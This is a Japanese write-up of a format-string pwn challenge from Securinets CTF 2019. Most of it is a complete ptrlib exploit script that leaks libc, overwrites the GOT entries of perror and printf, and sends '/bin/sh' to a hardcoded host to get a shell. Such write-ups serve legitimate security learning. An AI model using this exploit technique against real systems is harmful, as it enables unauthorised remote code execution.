# [pwn 998pts] Simple - Securinets CTF 2019 Quals
64ビットバイナリです．
libcは配布されていません．
```
$ checksec simple
[*] 'simple'
    Arch:	64 bits (little endian)
    NX:		NX enabled
    SSP:	SSP enabled (Canary found)
    RELRO:	Partial RELRO
    PIE:	PIE disabled
```
setbufして文字列を0x3fバイト読んだあと，printfでそのまま出力しています．
最後にperrorで"hemm okay"という文字列を出力しています．
典型的なFSBですが，64bitという点に注意して解きましょう．

まずperrorのGOTを書き換えてmainに変更します．
また，同時にmain関数のリターンアドレスをリークしてlibcのアドレスを特定します．
これで何度でもFSBを利用できる形になるので，2回目のFSBでprintfのGOTをsystem関数のアドレスに変更し，3回目に`/bin/sh`を渡すと`system("/bin/sh")`が呼び出されます．

```python
from ptrlib import *

elf = ELF("./simple")
libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")
diff = 0xf0
sock = Socket("51.254.114.246", 4444)
#libc = ELF("/lib64/libc.so.6")
#diff = 0xf5
#sock = Socket("127.0.0.1", 4000)
_ = input()

addr_main = elf.symbol("main")
got_perror = elf.got("perror")
got_printf = elf.got("printf")

""" Stage 1 """
writes = {}
for i in range(2):
    writes[got_perror + i] = (addr_main >> (8 * i)) & 0xFF
payload = '%17$p....'
offset = 6 + 32 // 8
n = 4 + 14
for (i, addr) in enumerate(writes):
    l = (writes[addr] - n - 1) % 256 + 1
    payload += '%{}c%{}$hhn'.format(l, offset + i)
    n += l
assert len(payload) == (offset - 6) * 8
payload = str2bytes(payload)
for addr in writes:
    payload += p64(addr)
assert len(payload) < 0x40
payload = payload + b'\x00' * (0x3f - len(payload))
sock.send(payload)
addr = int(sock.recvuntil(".").rstrip(b"."), 16)
libc_base = addr - libc.symbol("__libc_start_main") - diff
addr_system = libc_base + libc.symbol("system")
dump("libc base = " + hex(libc_base))

""" Stage 2 """
writes = {}
for i in range(3):
    writes[got_printf + i] = (addr_system >> (8 * i)) & 0xFF
payload = ''
offset = 6 + 40 // 8
n = 0
for (i, addr) in enumerate(writes):
    l = (writes[addr] - n - 1) % 256 + 1
    payload += '%{}c%{}$hhn'.format(l, offset + i)
    n += l
payload += 'A' * (40 - len(payload))
assert len(payload) == (offset - 6) * 8
payload = str2bytes(payload)
for addr in writes:
    payload += p64(addr)
assert len(payload) <= 0x40
payload = payload + b'\x00' * (0x3f - len(payload))
sock.send(payload)

""" Stage 3 """
sock.send("/bin/sh\x00")
sock.interactive()
```

早くFSBをptrlibに実装しなくちゃ．

# 感想
題名の通りシンプルな問題ですね．
FSBの勉強として使えると思います．